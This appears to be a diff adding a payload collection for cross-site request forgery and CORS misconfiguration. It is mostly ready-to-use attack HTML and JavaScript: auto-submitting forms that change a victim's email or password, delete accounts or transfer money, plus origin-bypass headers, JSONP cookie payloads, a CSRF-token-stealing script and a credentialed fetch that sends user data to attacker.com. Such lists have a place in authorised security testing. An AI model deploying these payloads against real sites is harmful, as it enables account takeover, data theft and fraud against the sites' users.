@@ -1,0 +1,398 @@
+# CSRF/CORS Payloads - Comprehensive Collection
+# Version: 1.0.17-20260301-Minggu-1738-WIB
+# Category: Cross-Site Request Forgery / Cross-Origin Resource Sharing
+
+# ============================================
+# BASIC CSRF
+# ============================================
+
+# HTML Forms
+<html>
+<body>
+<form action="https://target.com/change-email" method="POST">
+<input type="hidden" name="email" value="attacker@attacker.com">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# Image tag (GET request)
+<img src="https://target.com/delete-account">
+
+# Script tag
+<script src="https://target.com/logout">
+
+# ============================================
+# JSON CSRF
+# ============================================
+
+# POST with JSON content type
+<html>
+<body>
+<script>
+fetch('https://target.com/api/change-email', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+        email: 'attacker@attacker.com'
+    })
+});
+</script>
+</body>
+</html>
+
+# ============================================
+# JSON CSRF WITH CORS
+# ============================================
+
+<html>
+<body>
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'https://target.com/api/change-email');
+xhr.setRequestHeader('Content-Type', 'application/json');
+xhr.send('{"email":"attacker@attacker.com"}');
+</script>
+</body>
+</html>
+
+# ============================================
+# CSRF WITH BASE TAG
+# ============================================
+
+<base href="https://target.com/">
+<html>
+<body>
+<form action="change-email" method="POST">
+<input type="hidden" name="email" value="attacker@attacker.com">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# ============================================
+# CORS MISCONFIGURATION
+# ============================================
+
+# Test for CORS misconfiguration
+
+# Origin: null
+Origin: null
+
+# Origin: attacker domain
+Origin: http://attacker.com
+
+# Wildcard
+Origin: *
+
+# Multiple origins
+Origin: http://target.com
+Origin: http://attacker.com
+
+# ============================================
+# CORS - TEST PAYLOADS
+# ============================================
+
+# Test with various origins
+Origin: http://target.com
+Origin: https://target.com
+Origin: http://www.target.com
+Origin: https://www.target.com
+Origin: http://api.target.com
+Origin: https://api.target.com
+
+# Null origin
+Origin: null
+Origin: null
+
+# File protocol
+Origin: null
+
+# Subdomain takeover
+Origin: http://subdomain.target.com
+Origin: https://subdomain.target.com
+
+# ============================================
+# CORS - REFLECTED ORIGIN
+# ============================================
+
+# Check if origin is reflected
+Origin: http://evil.com
+Origin: http://attacker.com
+Origin: http://target.com.evil.com
+
+# ============================================
+# CORS - PREFLIGHT BYPASS
+# ============================================
+
+# Test OPTIONS request
+OPTIONS /api/user HTTP/1.1
+Host: target.com
+Origin: http://attacker.com
+Access-Control-Request-Method: GET, POST, PUT, DELETE
+
+# ============================================
+# CORS - CREDENTIALS
+# ============================================
+
+# Test with credentials
+Origin: http://attacker.com
+Cookie: session=abc123
+
+# Check Access-Control-Allow-Credentials
+
+# ============================================
+# CSRF - AUTO SUBMIT
+# ============================================
+
+<html>
+<body>
+<form id="csrf" action="https://target.com/change-password" method="POST">
+<input type="hidden" name="password" value="hacked123">
+</form>
+<body onload="document.getElementById('csrf').submit()">
+</body>
+</html>
+
+# ============================================
+# CSRF - FILE UPLOAD
+# ============================================
+
+<html>
+<body>
+<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
+<input type="file" name="avatar">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# ============================================
+# CSRF - CHANGE EMAIL
+# ============================================
+
+<html>
+<body>
+<form action="https://target.com/settings/email" method="POST">
+<input type="hidden" name="email" value="attacker@attacker.com">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# ============================================
+# CSRF - DELETE ACCOUNT
+# ============================================
+
+<html>
+<body>
+<form action="https://target.com/account/delete" method="POST">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+
+# ============================================
+# CORS - WILDCARD TEST
+# ============================================
+
+# Test wildcard origin
+Origin: *
+
+# Should not allow credentials with wildcard
+
+# ============================================
+# CORS - SUBDOMAIN TEST
+# ============================================
+
+Origin: http://subdomain.target.com
+Origin: http://staging.target.com
+Origin: http://dev.target.com
+Origin: http://test.target.com
+Origin: http://www.target.com
+
+# ============================================
+# CORS - REGEX BYPASS
+# ============================================
+
+Origin: http://target.com.attacker.com
+Origin: http://attacker-target.com
+Origin: http://targetcom.attacker.com
+Origin: http://target-come
+
+# ============================================
+# CSRF - JSONP
+# ============================================
+
+# Test JSONP callback
+https://target.com/api?callback=alert(document.cookie)
+https://target.com/api?jsonp=alert(document.cookie)
+
+# ============================================
+# CORS - VARY HEADER
+# ============================================
+
+# Check if Vary: Origin is present
+
+# ============================================
+# CSRF - DOUBLE SUBMIT
+# ============================================
+
+# Test CSRF token bypass
+# If token is only verified but not tied to session
+
+# ============================================
+# CORS - ALLOW CREDENTIALS
+# ============================================
+
+# Test with credentials
+Origin: http://attacker.com
+Access-Control-Request-Credentials: true
+
+# ============================================
+# CSRF - LINK ATTR
+# ============================================
+
+<a href="https://target.com/transfer?to=attacker&amount=10000">Click me</a>
+
+# ============================================
+# CORS - METHOD
+# ============================================
+
+# Test allowed methods
+Access-Control-Request-Method: GET
+Access-Control-Request-Method: POST
+Access-Control-Request-Method: PUT
+Access-Control-Request-Method: DELETE
+
+# ============================================
+# CORS - HEADER
+# ============================================
+
+# Test custom headers
+Access-Control-Request-Headers: X-Custom-Header
+
+# ============================================
+# CSRF - IFRAME
+# ============================================
+
+<iframe src="https://target.com/change-email?email=attacker@attacker.com" style="display:none">
+
+# ============================================
+# CSRF - CORS CHAIN
+# ============================================
+
+# 1. CORS misconfiguration allows attacker origin
+# 2. Attacker page makes request to target
+# 3. Response with sensitive data sent to attacker
+
+# ============================================
+# CSRF - STATE CHANGES
+# ============================================
+
+# POST request - state changing
+# GET request - state changing (less common)
+
+# Test all state-changing operations:
+# - Change email
+# - Change password
+# - Delete account
+# - Transfer money
+# - Upload file
+# - Delete data
+
+# ============================================
+# CORS - EXFILTRATION
+# ============================================
+
+# Exfiltrate data via CORS
+fetch('https://target.com/api/user', {
+    credentials: 'include'
+}).then(response => response.text())
+  .then(data => {
+      fetch('https://attacker.com/exfil?data=' + encodeURIComponent(data));
+  });
+
+# ============================================
+# CSRF - MFA BYPASS
+# ============================================
+
+# If MFA is not enforced on sensitive actions
+
+# ============================================
+# CORS - POST MESSAGE
+# ============================================
+
+# Test postMessage
+window.postMessage({secret: 'data'}, '*');
+
+# ============================================
+# CSRF - TOKEN BYPASS
+# ============================================
+
+# If token is only in header
+# Try putting token in custom header
+
+# ============================================
+# CORS - JSON CSRF
+# ============================================
+
+# Force content type
+Content-Type: application/json
+X-Requested-With: XMLHttpRequest
+
+# ============================================
+# CSRF - LINK PRELOAD
+# ============================================
+
+<link rel="preload" href="https://target.com/logout">
+
+# ============================================
+# CORS - TESTING ENDPOINTS
+# ============================================
+
+# Test sensitive endpoints via CORS
+/api/user/profile
+/api/user/settings
+/api/user/payment
+/api/admin/users
+
+# ============================================
+# CSRF - STEAL TOKEN
+# ============================================
+
+# If page shows CSRF token in response
+<script>
+fetch('/api/csrf-token')
+  .then(r => r.json())
+  .then(data => {
+      fetch('/api/change-email', {
+          method: 'POST',
+          headers: {
+              'X-CSRF-Token': data.token
+          }
+      });
+  });
+</script>
+
+# ============================================
+# CORS - REFLECTED + CREDENTIALS
+# ============================================
+
+# Dangerous combination
+Access-Control-Allow-Origin: http://attacker.com
+Access-Control-Allow-Credentials: true
+
+# ============================================
+# CSRF - JSON PRE-FILTER
+# ============================================
+
+# Test preflight
+OPTIONS /api/data HTTP/1.1
+Host: target.com
+Origin: http://attacker.com
+Access-Control-Request-Method: POST
+Access-Control-Request-Headers: Content-Type
+
